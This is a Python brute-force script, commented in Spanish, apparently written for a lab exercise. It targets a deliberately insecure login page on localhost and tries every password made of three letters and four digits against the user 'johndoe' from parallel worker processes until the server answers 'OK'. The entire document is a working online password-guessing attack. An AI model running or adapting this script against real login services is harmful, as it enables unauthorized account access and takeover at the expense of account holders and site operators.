import itertools
import requests
from multiprocessing import Pool
import signal

# Configuración
URL = "http://localhost:8080/login_inseguro.php"
USERNAME = "johndoe"
LETTERS = "abcdefghijklmnopqrstuvwxyz"
MAX_WORKERS = 4  # Ajusta según tu CPU
START = "pwc0000"  # Contraseña inicial para empezar

# Generador de contraseñas desde un punto dado
def generate_passwords(start='aaa0000'):
    start_letters = start[:3]
    start_number = int(start[3:])
    skipping = True

    for letters_part in itertools.product(LETTERS, repeat=3):
        prefix = ''.join(letters_part)
        if skipping:
            if prefix == start_letters:
                skipping = False
            else:
                continue

        for number in range(10000):
            if skipping and number < start_number:
                continue
            skipping = False
            yield f"{prefix}{number:04d}"

# Función que hace la petición HTTP
def try_password(password):
    try:
        with requests.Session() as s:
            response = s.post(URL, data={"loginName": USERNAME, "password": password})
            if "OK" in response.text:
                print(f"[✓] ¡Contraseña encontrada!: {password}")
                return password
            else:
                print(f"[-] {password}")
    except Exception as e:
        print(f"[!] Error con {password}: {e}")
    return None

# Main
if __name__ == "__main__":
    with Pool(processes=MAX_WORKERS) as pool:
        for result in pool.imap_unordered(try_password, generate_passwords(START), chunksize=10):
            if result:
                pool.terminate()
                break
